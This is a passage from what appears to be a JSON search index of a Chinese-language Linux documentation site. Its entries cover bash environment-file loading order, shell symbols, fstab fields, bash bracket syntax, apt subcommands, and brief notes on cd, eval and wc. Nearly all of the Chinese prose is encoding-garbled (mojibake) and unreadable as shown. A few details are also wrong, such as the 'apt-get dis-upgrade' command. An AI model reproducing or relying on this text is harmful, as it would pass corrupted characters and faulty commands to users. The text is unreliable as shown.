å¦‚æœç”¨æˆ·çš„Shell ä¸æ˜¯ç™»å½•æ—¶å¯åŠ¨çš„ï¼ˆæ¯”å¦‚æ‰‹åŠ¨æ•²ä¸‹ bash æ—¶å¯åŠ¨æˆ–è€…å…¶ä»–ä¸éœ€è¦è¾“å…¥å¯†ç çš„ç™»å½•åŠè¿œç¨‹ SSH è¿æ¥æƒ…å†µï¼‰ é‚£ä¹ˆè¿™ç§éç™»å½• Shell åªä¼šåŠ è½½ ~/.bashrc`ï¼ˆç”¨æˆ·ç¯å¢ƒå˜é‡æ–‡ä»¶ï¼‰ï¼Œå¹¶ä¼šå»æ‰¾ `/etc/bashrc`ï¼ˆå…¨å±€ç¯å¢ƒå˜é‡æ–‡ä»¶ï¼‰ï¼Œ å› æ­¤å¦‚æœå¸Œæœ›åœ¨éç™»å½• Shell ä¸‹ä¹Ÿå¯è¯»åˆ°è®¾ç½®çš„ç¯å¢ƒå˜é‡ç­‰å†…å®¹ï¼Œ å°±éœ€è¦å°†å˜é‡è®¾å®šå†™å…¥ `~/.bashrc æˆ–è€… /etc/bashrc ï¼Œè€Œä¸æ˜¯ ~/.bash_profile æˆ– /etc/profile ç¯å¢ƒå˜é‡ç›¸å…³æ–‡ä»¶ /etc/profileï¼šç³»ç»Ÿé…ç½®æ–‡ä»¶ï¼Œç”¨æˆ·ç™»å½•æ—¶è¯»å–ä¸€æ¬¡ /etc/profile.d: ç³»ç»Ÿé…ç½®æ–‡ä»¶å¤¹, ä¸€èˆ¬ä¸‹é¢çš„ .sh æ–‡ä»¶ä¼šåœ¨/etc/profileåŠ è½½ä¹‹åè¿›è¡ŒåŠ è½½ /etc/bash.bashrcï¼šï¼ˆUbuntuï¼‰ç³»ç»Ÿé…ç½®æ–‡ä»¶ï¼Œç”¨æˆ·ç™»å½•æ—¶è¯»å–ä¸€æ¬¡ï¼Œæ¯æ¬¡æ‰“å¼€ä¸€ä¸ªæ–°ç»ˆç«¯ä¼šè¯æ—¶è¯»å–ä¸€æ¬¡ã€‚ /etc/bashrcï¼š ï¼ˆCentosï¼‰ç³»ç»Ÿé…ç½®æ–‡ä»¶ï¼Œç”¨æˆ·ç™»å½•æ—¶è¯»å–ä¸€æ¬¡ï¼Œæ¯æ¬¡æ‰“å¼€ä¸€ä¸ªæ–°ç»ˆç«¯ä¼šè¯æ—¶è¯»å–ä¸€æ¬¡ã€‚ ~/.profileï¼ˆ~/.bash_profileã€~/.bash_loginï¼‰ï¼šç”¨æˆ·é…ç½®æ–‡ä»¶ï¼Œç”¨æˆ·ç™»å½•æ—¶è¯»å–ä¸€æ¬¡ ~/.bashrcï¼šç”¨æˆ·é…ç½®æ–‡ä»¶ï¼Œç”¨æˆ·ç™»å½•æ—¶è¯»å–ä¸€æ¬¡ï¼Œæ¯æ¬¡æ‰“å¼€ä¸€ä¸ªæ–°ç»ˆç«¯ä¼šè¯æ—¶è¯»å–ä¸€æ¬¡ å¯¹äº ~/.bash_profileã€~/.bash_loginã€~/.profileï¼Œå¦‚æœç»ˆç«¯ç»‘å®šçš„æ˜¯ bashï¼Œ åˆ™æŒ‰ç…§é¡ºåºè¿›è¡Œè¯»å–ï¼ˆå¦‚æœå­˜åœ¨ï¼Œå°±ä¸ç»§ç»­è¯»å–ï¼‰ ç³»ç»Ÿé…ç½®æ–‡ä»¶ä½œç”¨äºå…¨å±€ï¼Œè€Œç”¨æˆ·é…ç½®æ–‡ä»¶ä»…é’ˆå¯¹å½“å‰ç™»å½•çš„ç”¨æˆ· å…ˆè¯»å–ç³»ç»Ÿé…ç½®æ–‡ä»¶ï¼Œå†è¯»å–ç”¨æˆ·é…ç½®æ–‡ä»¶ï¼Œç”¨æˆ·é…ç½®æ–‡ä»¶çš„å˜é‡å’Œè¡¨è¾¾å¼ç­‰éƒ½ç»§æ‰¿è‡ªç³»ç»Ÿé…ç½®æ–‡ä»¶","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Conceptual-Linux-system-environment-loading-order.html","loc":"/yq-doc-source-docs-operating-system-linux-Conceptual-Linux-system-environment-loading-order.html"},{"title":"ç‰¹æ®Šç¬¦å·","text":"code: & è¡¨ç¤ºä»»åŠ¡åœ¨åå°æ‰§è¡Œï¼Œå¦‚è¦åœ¨åå°è¿è¡Œ && è¡¨ç¤ºå‰ä¸€æ¡å‘½ä»¤æ‰§è¡ŒæˆåŠŸæ—¶ï¼Œæ‰æ‰§è¡Œåä¸€æ¡å‘½ä»¤ | è¡¨ç¤ºç®¡é“ï¼Œä¸Šä¸€æ¡å‘½ä»¤çš„è¾“å‡ºï¼Œä½œä¸ºä¸‹ä¸€æ¡å‘½ä»¤å‚æ•°(è¾“å…¥) || è¡¨ç¤ºä¸Šä¸€æ¡å‘½ä»¤æ‰§è¡Œå¤±è´¥åï¼Œæ‰æ‰§è¡Œä¸‹ä¸€æ¡å‘½ä»¤ > ç¬¦å·æ˜¯æŒ‡ï¼šå°†æ­£å¸¸ä¿¡æ¯é‡å®šå‘","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Conceptual-Special-symbol.html","loc":"/yq-doc-source-docs-operating-system-linux-Conceptual-Special-symbol.html"},{"title":"fstab","text":"æ¦‚è¿° /etc/fstabæ˜¯ç”¨æ¥å­˜æ”¾æ–‡ä»¶ç³»ç»Ÿçš„é™æ€ä¿¡æ¯çš„æ–‡ä»¶ã€‚ ç³»ç»Ÿå¯åŠ¨çš„æ—¶å€™ï¼Œç³»ç»Ÿä¼šè‡ªåŠ¨ä»è¿™ä¸ªæ–‡ä»¶è¯»å–ä¿¡æ¯ï¼Œå¹¶ä¸”ä¼šè‡ªåŠ¨çš„å°†æ–‡ä»¶ä¸­æŒ‡å®šçš„æ–‡ä»¶ç³»ç»ŸæŒ‚è½½åˆ°æŒ‡å®šçš„ç›®å½•ã€‚ æŸ¥çœ‹: less /etc/fstab å­—æ®µå®šä¹‰: <file system> <dir> <type> <options> <dump> <pass> <file system>ï¼šè¦æŒ‚è½½çš„åˆ†åŒºæˆ–è€…å­˜å‚¨è®¾å¤‡ <dir>ï¼šæŒ‚è½½çš„ä½ç½®ï¼ˆè·¯å¾„ï¼‰ <type>ï¼šæŒ‚è½½è®¾å¤‡æˆ–è€…åˆ†åŒºçš„æ–‡ä»¶ç³»ç»Ÿç±»å‹ï¼Œ å¦‚ï¼šext2,ext3,ext4,ntfs,swap,autoç­‰ <options>ï¼šæŒ‚è½½æ—¶ä½¿ç”¨çš„å‚æ•°ï¼Œæ³¨æ„æœ‰äº›mountå‚æ•°æ˜¯ç‰¹å®šæ–‡ä»¶ç³»ç»Ÿæ‰æœ‰çš„ <dump>ï¼šdumpå·¥å…·é€šè¿‡å®ƒå†³å®šä½•æ—¶å¤‡ä»½ã€‚ å…è®¸å†™å…¥æ•°å­—0,1 0è¡¨ç¤ºå¿½ç•¥ï¼›1ï¼Œè¡¨ç¤ºè¢«å° <pass>ï¼šå†³å®šfsckéœ€è¦æ£€æŸ¥æ–‡ä»¶ç³»ç»Ÿçš„æ£€æŸ¥é¡ºåº å…è®¸å†™å…¥0,1,2 æ ¹ç›®å½•åº”å½“è·å–æœ€é«˜çš„ä¼˜å…ˆæƒ1ï¼Œå…¶ä»–æ‰€æœ‰éœ€è¦è¢«æ£€æŸ¥çš„è®¾å¤‡è®¾ç½®ä¸º2ï¼Œ0è¡¨ç¤ºè®¾å¤‡ä¸ä¼šfsckè¢«æ£€æŸ¥ æ–‡ä»¶ç³»ç»Ÿæ ‡è¯† ä¸‰ç§æ–¹æ³•ï¼š å†…æ ¸åç§° uuid label å…¶ä¸­ä½¿ç”¨uuidä¸labelå¥½å¤„åœ¨äºä¸ç£ç›˜é¡ºåºæ— å…³","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Conceptual-fstab.html","loc":"/yq-doc-source-docs-operating-system-linux-Conceptual-fstab.html"},{"title":"bashæ‹¬å·","text":"å•å°æ‹¬å·() å‘½ä»¤ç»„ã€‚ æ‹¬å·ä¸­çš„å‘½ä»¤å°†ä¼šæ–°å¼€ä¸€ä¸ªå­shellé¡ºåºæ‰§è¡Œï¼Œæ‰€ä»¥æ‹¬å·ä¸­çš„å˜é‡ä¸èƒ½å¤Ÿè¢«è„šæœ¬ä½™ä¸‹çš„éƒ¨åˆ†ä½¿ç”¨ã€‚ æ‹¬å·ä¸­å¤šä¸ªå‘½ä»¤ä¹‹é—´ç”¨åˆ†å·éš”å¼€ï¼Œæœ€åä¸€ä¸ªå‘½ä»¤å¯ä»¥æ²¡æœ‰åˆ†å·ï¼Œå„å‘½ä»¤å’Œæ‹¬ å·ä¹‹é—´ä¸å¿…æœ‰ç©ºæ ¼ã€‚ å‘½ä»¤æ›¿æ¢ã€‚ ç­‰åŒäº cmd ï¼Œshellæ‰«æä¸€éå‘½ä»¤è¡Œï¼Œå‘ç°äº† $(cmd) ç»“æ„ï¼Œä¾¿å°†$(cmd)ä¸­çš„cmdæ‰§è¡Œä¸€æ¬¡ï¼Œ å¾—åˆ°å…¶æ ‡å‡†è¾“å‡ºï¼Œå†å°†æ­¤è¾“å‡ºæ”¾åˆ°åŸæ¥å‘½ä»¤ã€‚æœ‰äº›shellä¸æ”¯æŒï¼Œå¦‚tcshã€‚ åˆå§‹åŒ–æ•°ç»„ã€‚ å¦‚: array=(a b c d) åŒå°æ‹¬å·(()) æ•´æ•°æ‰©å±•ã€‚ è¿™ç§æ‰©å±•è®¡ç®—æ˜¯æ•´æ•°å‹çš„è®¡ç®—ï¼Œä¸æ”¯æŒæµ®ç‚¹å‹ã€‚ ((exp))ç»“æ„æ‰©å±•å¹¶è®¡ç®—ä¸€ä¸ªç®—æœ¯è¡¨è¾¾å¼çš„å€¼ï¼Œå¦‚æœè¡¨è¾¾å¼çš„ç»“æœä¸º0ï¼Œ é‚£ä¹ˆè¿”å›çš„é€€å‡ºçŠ¶æ€ç ä¸º1ï¼Œæˆ–è€…æ˜¯\"å‡\"ï¼Œ è€Œä¸€ä¸ªéé›¶å€¼çš„è¡¨è¾¾å¼æ‰€è¿”å›çš„é€€å‡ºçŠ¶æ€ç å°†ä¸º0ï¼Œæˆ–è€…æ˜¯\"true\"ã€‚ è‹¥æ˜¯é€»è¾‘åˆ¤æ–­ï¼Œè¡¨è¾¾å¼expä¸ºçœŸåˆ™ä¸º1,å‡åˆ™ä¸º0ã€‚ åªè¦æ‹¬å·ä¸­çš„è¿ç®—ç¬¦ã€è¡¨è¾¾å¼ç¬¦åˆCè¯­è¨€è¿ç®—è§„åˆ™ï¼Œéƒ½å¯ç”¨åœ¨$((exp))ä¸­ï¼Œç”šè‡³æ˜¯ä¸‰ç›®è¿ç®—ç¬¦ã€‚ ä½œä¸åŒè¿›ä½(å¦‚äºŒè¿›åˆ¶ã€å…«è¿›åˆ¶ã€åå…­è¿›åˆ¶)è¿ç®—æ—¶ï¼Œè¾“å‡ºç»“æœå…¨éƒ½è‡ªåŠ¨è½¬åŒ–æˆäº†åè¿›åˆ¶ã€‚ å¦‚: echo $((16#5f)) ç»“æœä¸º95 (16è¿›ä½è½¬åè¿›åˆ¶) å•çº¯ç”¨ (( )) ä¹Ÿå¯é‡å®šä¹‰å˜é‡å€¼ï¼Œæ¯”å¦‚ a=5; ((a++)) å¯å°† $a é‡å®šä¹‰ä¸º6ã€‚ å¸¸ç”¨äºç®—æœ¯è¿ç®—æ¯”è¾ƒï¼ŒåŒæ‹¬å·ä¸­çš„å˜é‡å¯ä»¥ä¸ä½¿ç”¨$ç¬¦å·å‰ç¼€ã€‚ æ‹¬å·å†…æ”¯æŒå¤šä¸ªè¡¨è¾¾å¼ç”¨é€—å·åˆ†å¼€ã€‚ åªè¦æ‹¬å·ä¸­çš„è¡¨è¾¾å¼ç¬¦åˆCè¯­è¨€è¿ç®—è§„åˆ™, æ¯”å¦‚å¯ä»¥ç›´æ¥ä½¿ç”¨: for((i=0;i<5;i++)) å¦‚æœä¸ä½¿ç”¨åŒæ‹¬å·, åˆ™ä¸º: for i in `seq 0 4` æˆ–è€…: for i in {0..4} å†å¦‚å¯ä»¥ç›´æ¥ä½¿ç”¨: if (($i<5)) å¦‚æœä¸ä½¿ç”¨åŒæ‹¬å·, åˆ™ä¸º: if [ $i -lt 5 ] [] ä¸»è¦ç”¨äºå­—ç¬¦ä¸²æ¯”è¾ƒå’Œæ•´æ•°æ¯”è¾ƒ bash çš„å†…éƒ¨å‘½ä»¤ï¼Œ[å’Œtestæ˜¯ç­‰åŒçš„ã€‚ å¦‚æœæˆ‘ä»¬ä¸ç”¨ç»å¯¹è·¯å¾„æŒ‡æ˜ï¼Œé€šå¸¸æˆ‘ä»¬ç”¨çš„éƒ½æ˜¯bashè‡ªå¸¦çš„å‘½ä»¤ã€‚ if/testç»“æ„ä¸­çš„å·¦ä¸­æ‹¬å·æ˜¯è°ƒç”¨testçš„å‘½ä»¤æ ‡è¯†ï¼Œå³ä¸­æ‹¬å·æ˜¯å…³é—­æ¡ä»¶åˆ¤æ–­çš„ã€‚ è¿™ä¸ªå‘½ä»¤æŠŠå®ƒçš„å‚æ•°ä½œä¸ºæ¯”è¾ƒè¡¨è¾¾å¼æˆ–è€…ä½œä¸ºæ–‡ä»¶æµ‹è¯•ï¼Œ å¹¶ä¸”æ ¹æ®æ¯”è¾ƒçš„ç»“æœæ¥è¿”å›ä¸€ä¸ªé€€å‡ºçŠ¶æ€ç ã€‚ if/testç»“æ„ä¸­å¹¶ä¸æ˜¯å¿…é¡»å³ä¸­æ‹¬å·ï¼Œä½†æ˜¯æ–°ç‰ˆçš„Bashä¸­è¦æ±‚å¿…é¡»è¿™æ ·ã€‚ testå’Œ[]ä¸­å¯ç”¨çš„æ¯”è¾ƒè¿ç®—ç¬¦åªæœ‰==å’Œ!=ï¼Œä¸¤è€…éƒ½æ˜¯ç”¨äºå­—ç¬¦ä¸²æ¯”è¾ƒçš„ï¼Œ ä¸å¯ç”¨äºæ•´æ•°æ¯”è¾ƒï¼Œæ•´æ•°æ¯”è¾ƒåªèƒ½ä½¿ç”¨-eqï¼Œ-gtè¿™ç§å½¢å¼ã€‚ æ— è®ºæ˜¯å­—ç¬¦ä¸²æ¯”è¾ƒè¿˜æ˜¯æ•´æ•°æ¯”è¾ƒéƒ½ä¸æ”¯æŒå¤§äºå·å°äºå·ã€‚ å¦‚æœå®åœ¨æƒ³ç”¨ï¼Œå¯¹äºå­—ç¬¦ä¸²æ¯”è¾ƒå¯ä»¥ä½¿ç”¨è½¬ä¹‰å½¢å¼ï¼Œ å¦‚æœæ¯”è¾ƒ\"ab\"å’Œ\"bc\"ï¼š[ ab < bc ]ï¼Œç»“æœä¸ºçœŸï¼Œä¹Ÿå°±æ˜¯è¿”å›çŠ¶æ€ä¸º0ã€‚ [ ]ä¸­çš„é€»è¾‘ä¸å’Œé€»è¾‘æˆ–ä½¿ç”¨-a å’Œ-o è¡¨ç¤ºã€‚ å­—ç¬¦ä¸²æ¯”è¾ƒæ—¶å¯ç”¨ == å’Œ != ï¼Œè€Œæ•´æ•°æ¯”è¾ƒæ—¶è¦ä½¿ç”¨: -eq #ç­‰äº equal -ne #ä¸ç­‰äº not equal æœ‰äº›è¯´æ˜¯ inequality -gt #å¤§äº greater than -lt #å°äº less than -ge #å¤§äºç­‰äº greater than or equal -le #å°äºç­‰äº less than or equal å­—ç¬¦èŒƒå›´ã€‚ç”¨ä½œæ­£åˆ™è¡¨è¾¾å¼çš„ä¸€éƒ¨åˆ†ï¼Œæè¿°ä¸€ä¸ªåŒ¹é…çš„å­—ç¬¦èŒƒå›´ã€‚ä½œä¸ºtestç”¨é€”çš„ä¸­æ‹¬å·å†…ä¸èƒ½ä½¿ç”¨æ­£åˆ™ã€‚ åœ¨ä¸€ä¸ªarray ç»“æ„çš„ä¸Šä¸‹æ–‡ä¸­ï¼Œä¸­æ‹¬å·ç”¨æ¥å¼•ç”¨æ•°ç»„ä¸­æ¯ä¸ªå…ƒç´ çš„ç¼–å·ã€‚ åŒä¸­æ‹¬å·[[]] [[æ˜¯ bash ç¨‹åºè¯­è¨€çš„å…³é”®å­—ã€‚ å¹¶ä¸æ˜¯ä¸€ä¸ªå‘½ä»¤ï¼Œ[[ ]] ç»“æ„æ¯”[ ]ç»“æ„æ›´åŠ é€šç”¨ã€‚ åœ¨[[å’Œ]]ä¹‹é—´æ‰€æœ‰çš„å­—ç¬¦éƒ½ä¸ä¼šå‘ç”Ÿæ–‡ä»¶åæ‰©å±•æˆ–è€…å•è¯åˆ†å‰²ï¼Œä½†æ˜¯ä¼šå‘ç”Ÿå‚æ•°æ‰©å±•å’Œå‘½ä»¤æ›¿æ¢ã€‚ æ”¯æŒå­—ç¬¦ä¸²çš„æ¨¡å¼åŒ¹é…ï¼Œä½¿ç”¨=~æ“ä½œç¬¦æ—¶ç”šè‡³æ”¯æŒshellçš„æ­£åˆ™è¡¨è¾¾å¼ã€‚ å­—ç¬¦ä¸²æ¯”è¾ƒæ—¶å¯ä»¥æŠŠå³è¾¹çš„ä½œä¸ºä¸€ä¸ªæ¨¡å¼ï¼Œè€Œä¸ä»…ä»…æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œ æ¯”å¦‚[[ hello == hell? ]]ï¼Œç»“æœä¸ºçœŸã€‚[[ ]] ä¸­åŒ¹é…å­—ç¬¦ä¸²æˆ–é€šé…ç¬¦ï¼Œä¸éœ€è¦å¼•å·ã€‚ ä½¿ç”¨[[ ... ]]æ¡ä»¶åˆ¤æ–­ç»“æ„ï¼Œè€Œä¸æ˜¯[ ... ]ï¼Œèƒ½å¤Ÿé˜²æ­¢è„šæœ¬ä¸­çš„è®¸å¤šé€»è¾‘é”™è¯¯ã€‚ æ¯”å¦‚ï¼Œ&&ã€||ã€<å’Œ> æ“ä½œç¬¦èƒ½å¤Ÿæ­£å¸¸å­˜åœ¨äº[[ ]]æ¡ä»¶åˆ¤æ–­ç»“æ„ä¸­ï¼Œ ä½†æ˜¯å¦‚æœå‡ºç°åœ¨[ ]ç»“æ„ä¸­çš„è¯ï¼Œä¼šæŠ¥é”™ã€‚ æ¯”å¦‚å¯ä»¥ç›´æ¥ä½¿ç”¨: if [[ $a != 1 && $a != 2 ]] å¦‚æœä¸é€‚ç”¨åŒæ‹¬å·, åˆ™ä¸º: if [ $a -ne 1] && [ $a != 2 ] # æˆ–è€… if [ $a -ne 1 -a $a != 2 ] bashæŠŠåŒä¸­æ‹¬å·ä¸­çš„è¡¨è¾¾å¼çœ‹ä½œä¸€ä¸ªå•ç‹¬çš„å…ƒç´ ï¼Œå¹¶è¿”å›ä¸€ä¸ªé€€å‡ºçŠ¶æ€ç ã€‚ ç¬¦å·$åçš„æ‹¬å· ï¼ˆ1ï¼‰${a} å˜é‡açš„å€¼, åœ¨ä¸å¼•èµ·æ­§ä¹‰çš„æƒ…å†µä¸‹å¯ä»¥çœç•¥å¤§æ‹¬å·ã€‚ ï¼ˆ2ï¼‰$(cmd) å‘½ä»¤æ›¿æ¢ï¼Œå’Œ cmd æ•ˆæœç›¸åŒï¼Œç»“æœä¸ºshellå‘½ä»¤cmdçš„è¾“ï¼Œè¿‡æŸäº›Shellç‰ˆæœ¬ä¸æ”¯æŒ$()å½¢å¼çš„å‘½ä»¤æ›¿æ¢, å¦‚tcshã€‚ ï¼ˆ3ï¼‰$((expression)) å’Œ exprexpression æ•ˆæœç›¸åŒ, è®¡ç®—æ•°å­¦è¡¨è¾¾å¼expçš„æ•°å€¼, å…¶ä¸­expåªè¦ç¬¦åˆCè¯­è¨€çš„è¿ç®—è§„åˆ™å³å¯, ç”šè‡³ä¸‰ç›®è¿ç®—ç¬¦å’Œé€»è¾‘è¡¨è¾¾å¼éƒ½å¯ä»¥è®¡ç®—ã€‚ å¤šæ¡å‘½ä»¤æ‰§è¡Œ ï¼ˆ1ï¼‰å•å°æ‹¬å·ï¼Œ(cmd1;cmd2;cmd3) æ–°å¼€ä¸€ä¸ªå­shellé¡ºåºæ‰§è¡Œå‘½ä»¤cmd1,cmd2,cmd3, å„å‘½ä»¤ä¹‹é—´ç”¨åˆ†å·éš”å¼€, æœ€åä¸€ä¸ªå‘½ä»¤åå¯ä»¥æ²¡æœ‰åˆ†å·ã€‚ ï¼ˆ2ï¼‰å•å¤§æ‹¬å·ï¼Œ{ cmd1;cmd2;cmd3;} åœ¨å½“å‰shellé¡ºåºæ‰§è¡Œå‘½ä»¤cmd1,cmd2,cmd3, å„å‘½ä»¤ä¹‹é—´ç”¨åˆ†å·éš”å¼€, æœ€åä¸€ä¸ªå‘½ä»¤åå¿…é¡»æœ‰åˆ†å·, ç¬¬ä¸€æ¡å‘½ä»¤å’Œå·¦æ‹¬å·ä¹‹é—´å¿…é¡»ç”¨ç©ºæ ¼éš”å¼€ã€‚ å¯¹{}å’Œ()è€Œè¨€, æ‹¬å·ä¸­çš„é‡å®šå‘ç¬¦åªå½±å“è¯¥æ¡å‘½ä»¤ï¼Œ è€Œæ‹¬å·å¤–çš„é‡å®šå‘ç¬¦å½±å“åˆ°æ‹¬å·ä¸­çš„æ‰€æœ‰å‘½ä»¤ã€‚","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Conceptual-shell-bracket.html","loc":"/yq-doc-source-docs-operating-system-linux-Conceptual-shell-bracket.html"},{"title":"apt","text":"debian/ubuntu çš„ä¸‹çš„åŒ…ç®¡ç†å™¨ è¯­æ³•: apt <command> [options] [packages] æ”¯æŒçš„command show list install search depends æŸ¥çœ‹æŸä¸ªè½¯ä»¶åŒ…çš„ä¾èµ–ä¿¡æ¯ é€‰é¡¹å‚æ•° -y æ— éœ€è¾“å…¥yæ‰‹åŠ¨ç¡®è®¤æ˜¯å¦å®‰è£… install install å‘½ä»¤ç”¨æ¥å®‰è£…æˆ–è€…å‡çº§åŒ…ã€‚ æ¯ä¸ªåŒ…éƒ½æœ‰ä¸€ä¸ªåŒ…åï¼Œè€Œä¸æ˜¯ä¸€ä¸ªå®Œå…¨é™å®šçš„æ–‡ä»¶å(ä¾‹å¦‚ï¼Œåœ¨ Debian ç³»ç»Ÿä¸­ï¼Œæä¾›çš„å‚æ•°æ˜¯ apt-utilsï¼Œè€Œä¸æ˜¯ apt-utils_1.6.1_amd64.deb)ã€‚ è¢«å®‰è£…çš„åŒ…ä¾èµ–çš„åŒ…ä¹Ÿå°†è¢«å®‰è£…ã€‚é…ç½®æ–‡ä»¶ /etc/apt/sources.list ä¸­åŒ…å«äº†ç”¨äºè·å–åŒ…çš„æº(æœåŠ¡å™¨)ã€‚install å‘½ä»¤è¿˜å¯ä»¥ç”¨æ¥æ›´æ–°æŒ‡å®šçš„åŒ…ã€‚ upgrade upgrade å‘½ä»¤ç”¨äºä» /etc/apt/sources.list ä¸­åˆ—å‡ºçš„æºå®‰è£…ç³»ç»Ÿä¸Šå½“å‰å®‰è£…çš„æ‰€æœ‰åŒ…çš„æœ€æ–°ç‰ˆæœ¬ã€‚ åœ¨ä»»ä½•æƒ…å†µä¸‹ï¼Œå½“å‰å®‰è£…çš„è½¯ä»¶åŒ…éƒ½ä¸ä¼šè¢«åˆ é™¤ï¼Œå°šæœªå®‰è£…çš„è½¯ä»¶åŒ…ä¹Ÿä¸ä¼šè¢«æ£€ç´¢å’Œå®‰è£…ã€‚ å¦‚æœå½“å‰å®‰è£…çš„åŒ…çš„æ–°ç‰ˆæœ¬ä¸èƒ½åœ¨ä¸æ›´æ”¹å¦ä¸€ä¸ªåŒ…çš„å®‰è£…çŠ¶æ€çš„æƒ…å†µä¸‹å‡çº§ï¼Œåˆ™å°†ä¿ç•™å½“å‰ç‰ˆæœ¬ã€‚ å¿…é¡»æå‰æ‰§è¡Œ update å‘½ä»¤ä»¥ä¾¿ apt-get çŸ¥é“å·²å®‰è£…çš„åŒ…æ˜¯å¦æœ‰æ–°ç‰ˆæœ¬å¯ç”¨ã€‚ æ³¨æ„ update ä¸ upgrade çš„åŒºåˆ«ï¼š update æ˜¯æ›´æ–°è½¯ä»¶åˆ—è¡¨ï¼Œupgrade æ˜¯æ›´æ–°è½¯ä»¶ã€‚ dist-upgrade é™¤æ‰§è¡Œå‡çº§åŠŸèƒ½å¤–ï¼Œdist-upgrade è¿˜æ™ºèƒ½åœ°å¤„ç†ä¸æ–°ç‰ˆæœ¬åŒ…çš„ä¾èµ–å…³ç³»çš„å˜åŒ–ã€‚ apt-get æœ‰ä¸€ä¸ª \"æ™ºèƒ½\" çš„å†²çªè§£å†³ç³»ç»Ÿï¼Œå¦‚æœæœ‰å¿…è¦ï¼Œå®ƒå°†å°è¯•å‡çº§æœ€é‡è¦çš„åŒ…ï¼Œä»¥ç‰ºç‰²ä¸é‚£ä¹ˆé‡è¦çš„åŒ…ä¸ºä»£ä»·ã€‚ å› æ­¤ï¼Œdistr -upgrade å‘½ä»¤å¯èƒ½ä¼šåˆ é™¤ä¸€äº›åŒ…ã€‚ å› æ­¤åœ¨æ›´æ–°ç³»ç»Ÿä¸­çš„åŒ…æ—¶ï¼Œå»ºè®®æŒ‰é¡ºåºæ‰§è¡Œä¸‹é¢çš„å‘½ä»¤: $ apt-get update $ apt-get upgrade -y $ apt-get dis-upgrade -y remove remove ä¸ install ç±»ä¼¼ï¼Œä¸åŒä¹‹å¤„æ˜¯åˆ é™¤åŒ…è€Œä¸æ˜¯å®‰è£…åŒ…ã€‚æ³¨æ„ï¼Œä½¿ç”¨ remove å‘½ä»¤åˆ é™¤ä¸€ä¸ªåŒ…ä¼šå°†å…¶é…ç½®æ–‡ä»¶ç•™åœ¨ç³»ç»Ÿä¸Šã€‚ purge purge å‘½ä»¤ä¸ remove å‘½ä»¤ç±»ä¼¼ï¼Œpurge å‘½ä»¤åœ¨åˆ é™¤åŒ…çš„åŒæ—¶ä¹Ÿåˆ é™¤äº†åŒ…çš„é…ç½®æ–‡ä»¶ã€‚ autoremove autoremove å‘½ä»¤ç”¨äºåˆ é™¤è‡ªåŠ¨å®‰è£…çš„è½¯ä»¶åŒ…ï¼Œè¿™äº›è½¯ä»¶åŒ…å½“åˆæ˜¯ä¸ºäº†æ»¡è¶³å…¶ä»–è½¯ä»¶åŒ…å¯¹å®ƒçš„ä¾èµ–å…³ç³»è€Œå®‰è£…çš„ï¼Œè€Œç°åœ¨å·²ç»ä¸å†éœ€è¦äº†ã€‚ download download å‘½ä»¤æŠŠæŒ‡å®šåŒ…çš„äºŒè¿›åˆ¶æ–‡ä»¶ä¸‹è½½åˆ°å½“å‰ç›®å½•ä¸­ã€‚æ³¨æ„ï¼Œæ˜¯ç±»ä¼¼ *.deb è¿™æ ·çš„åŒ…æ–‡ä»¶ã€‚ clean clean å‘½ä»¤æ¸…é™¤åœ¨æœ¬åœ°åº“ä¸­æ£€ç´¢åˆ°çš„åŒ…ã€‚å®ƒä» /var/cache/apt/archives/ å’Œ /var/cache/apt/archives/partial/ ç›®å½•åˆ é™¤é™¤é”æ–‡ä»¶ä¹‹å¤–çš„æ‰€æœ‰å†…å®¹ã€‚ autoclean ä¸ clean å‘½ä»¤ç±»ä¼¼ï¼Œautoclean å‘½ä»¤æ¸…é™¤æ£€ç´¢åˆ°çš„åŒ…æ–‡ä»¶çš„æœ¬åœ°å­˜å‚¨åº“ã€‚ ä¸åŒä¹‹å¤„åœ¨äºï¼Œå®ƒåªåˆ é™¤ä¸èƒ½å†ä¸‹è½½çš„è½¯ä»¶åŒ…æ–‡ä»¶ï¼Œè€Œä¸”è¿™äº›æ–‡ä»¶åœ¨å¾ˆå¤§ç¨‹åº¦ä¸Šæ˜¯æ— ç”¨çš„ã€‚ è¿™å…è®¸é•¿æ—¶é—´ç»´æŠ¤ç¼“å­˜ï¼Œè€Œä¸è‡³äºå¤§å°å¤±æ§ã€‚ source source å‘½ä»¤ä¸‹è½½åŒ…çš„æºä»£ç ã€‚é»˜è®¤ä¼šä¸‹è½½æœ€æ–°å¯ç”¨ç‰ˆæœ¬çš„æºä»£ç åˆ°å½“å‰ç›®å½•ä¸­ã€‚ changelog changelog å‘½ä»¤å°è¯•ä¸‹è½½å¹¶æ˜¾ç¤ºåŒ…çš„æ›´æ–°æ—¥å¿—ã€‚ ç›¸å…³ apt-cache /docs/æ“ä½œç³»ç»Ÿ/linux/linuxæŒ‡ä»¤/apt-cache apt-get /docs/æ“ä½œç³»ç»Ÿ/linux/linuxæŒ‡ä»¤/apt-get","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-APT.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-APT.html"},{"title":"cd","text":"ç›®å½•çš„åˆ‡æ¢ è¿”å›æœ€è¿‘ä¸€æ¬¡çš„ç›®å½•: cd -","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-Chengdu.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-Chengdu.html"},{"title":"eval","text":"é‡æ–°è¿ç®—æ±‚å‡ºå‚æ•°çš„å†…å®¹","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-Eval.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-Eval.html"},{"title":"wc","text":"åˆ©ç”¨wcæŒ‡ä»¤æˆ‘ä»¬å¯ä»¥è®¡ç®—æ–‡ä»¶çš„Byteæ•°ã€å­—æ•°ã€æˆ–æ˜¯åˆ—æ•°ï¼Œè‹¥ä¸æŒ‡å®šæ–‡ä»¶åç§°ã€æˆ–æ˜¯æ‰€ç»™äºˆçš„æ–‡ä»¶åä¸º\"-\"ï¼Œåˆ™wcæŒ‡ä»¤